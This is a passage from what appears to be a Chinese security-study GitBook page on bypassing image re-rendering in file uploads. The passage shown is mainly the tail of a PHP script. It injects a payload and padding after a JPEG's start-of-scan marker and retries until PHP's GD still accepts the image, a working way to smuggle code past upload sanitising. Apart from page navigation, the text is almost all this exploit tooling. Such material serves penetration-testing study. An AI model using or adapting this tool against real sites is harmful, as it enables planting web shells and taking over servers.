            <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Incorrect SOI marker&apos;</span>);
        }

        <span class="hljs-keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="hljs-number">0xFF</span>)) {
            $marker = $dis-&gt;readByte();
            $size = $dis-&gt;readShort() - <span class="hljs-number">2</span>;
            $dis-&gt;skip($size);
            <span class="hljs-keyword">if</span>($marker === <span class="hljs-number">0xDA</span>) {
                $startPos = $dis-&gt;seek();
                $outStreamTmp = 
                    substr($outStream, <span class="hljs-number">0</span>, $startPos) . 
                    $miniPayload . 
                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage(<span class="hljs-string">&apos;_&apos;</span>.$argv[<span class="hljs-number">1</span>], $outStreamTmp, <span class="hljs-keyword">TRUE</span>);
                <span class="hljs-keyword">if</span>($extraBytes !== <span class="hljs-number">0</span>) {
                    <span class="hljs-keyword">while</span>((!$dis-&gt;eof())) {
                        <span class="hljs-keyword">if</span>($dis-&gt;readByte() === <span class="hljs-number">0xFF</span>) {
                            <span class="hljs-keyword">if</span>($dis-&gt;readByte !== <span class="hljs-number">0x00</span>) {
                                <span class="hljs-keyword">break</span>;
                            }
                        }
                    }
                    $stopPos = $dis-&gt;seek() - <span class="hljs-number">2</span>;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, <span class="hljs-number">0</span>, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            <span class="hljs-number">0</span>,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } <span class="hljs-keyword">elseif</span>($correctImage) {
                    $outStream = $outStreamTmp;
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">break</span>;
                }
                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&apos;payload_&apos;</span>.$argv[<span class="hljs-number">1</span>], $outStream)) {
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Success!&apos;</span>);
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">break</span>;
                }
            }
        }
    }
    unlink(<span class="hljs-string">&apos;payload_&apos;</span>.$argv[<span class="hljs-number">1</span>]);
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;Something\&apos;s wrong&apos;</span>);

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span><span class="hljs-params">($filename, $data, $unlink = FALSE)</span> </span>{
        <span class="hljs-keyword">global</span> $correctImage;
        file_put_contents($filename, $data);
        $correctImage = <span class="hljs-keyword">TRUE</span>;
        imagecreatefromjpeg($filename);
        <span class="hljs-keyword">if</span>($unlink)
            unlink($filename);
        <span class="hljs-keyword">return</span> $correctImage;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span><span class="hljs-params">($errno, $errstr, $errfile, $errline)</span> </span>{
        <span class="hljs-keyword">global</span> $extraBytes, $correctImage;
        $correctImage = <span class="hljs-keyword">FALSE</span>;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&apos;/(\d+) extraneous bytes before marker/&apos;</span>, $errstr, $m)) {
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($m[<span class="hljs-number">1</span>])) {
                $extraBytes = (int)$m[<span class="hljs-number">1</span>];
            }
        }
    }

    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>{
        <span class="hljs-keyword">private</span> $binData;
        <span class="hljs-keyword">private</span> $order;
        <span class="hljs-keyword">private</span> $size;

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($filename, $order = false, $fromString = false)</span> </span>{
            $this-&gt;binData = <span class="hljs-string">&apos;&apos;</span>;
            $this-&gt;order = $order;
            <span class="hljs-keyword">if</span>(!$fromString) {
                <span class="hljs-keyword">if</span>(!file_exists($filename) || !is_file($filename))
                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;File not exists [&apos;</span>.$filename.<span class="hljs-string">&apos;]&apos;</span>);
                $this-&gt;binData = file_get_contents($filename);
            } <span class="hljs-keyword">else</span> {
                $this-&gt;binData = $filename;
            }
            $this-&gt;size = strlen($this-&gt;binData);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-keyword">return</span> ($this-&gt;size - strlen($this-&gt;binData));
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span><span class="hljs-params">($skip)</span> </span>{
            $this-&gt;binData = substr($this-&gt;binData, $skip);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-keyword">if</span>($this-&gt;eof()) {
                <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;End Of File&apos;</span>);
            }
            $byte = substr($this-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);
            $this-&gt;binData = substr($this-&gt;binData, <span class="hljs-number">1</span>);
            <span class="hljs-keyword">return</span> ord($byte);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-keyword">if</span>(strlen($this-&gt;binData) &lt; <span class="hljs-number">2</span>) {
                <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;End Of File&apos;</span>);
            }
            $short = substr($this-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);
            $this-&gt;binData = substr($this-&gt;binData, <span class="hljs-number">2</span>);
            <span class="hljs-keyword">if</span>($this-&gt;order) {
                $short = (ord($short[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord($short[<span class="hljs-number">0</span>]);
            } <span class="hljs-keyword">else</span> {
                $short = (ord($short[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord($short[<span class="hljs-number">1</span>]);
            }
            <span class="hljs-keyword">return</span> $short;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-keyword">return</span> !$this-&gt;binData||(strlen($this-&gt;binData) === <span class="hljs-number">0</span>);
        }
    }
<span class="hljs-meta">?&gt;</span>
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="文件上传相关函数.html" class="navigation navigation-prev " aria-label="Previous page: 文件上传相关函数">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="代码逻辑绕过.html" class="navigation navigation-next " aria-label="Next page: 代码逻辑绕过">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"二次渲染绕过","level":"1.7.1.3","depth":3,"next":{"title":"代码逻辑绕过","level":"1.7.1.4","depth":3,"path":"VUL/代码逻辑绕过.md","ref":"./VUL/代码逻辑绕过.md","articles":[]},"previous":{"title":"文件上传相关函数","level":"1.7.1.2","depth":3,"path":"VUL/文件上传相关函数.md","ref":"./VUL/文件上传相关函数.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"VUL/二次渲染绕过.md","mtime":"2021-05-22T17:10:35.185Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-06-02T13:44:52.660Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

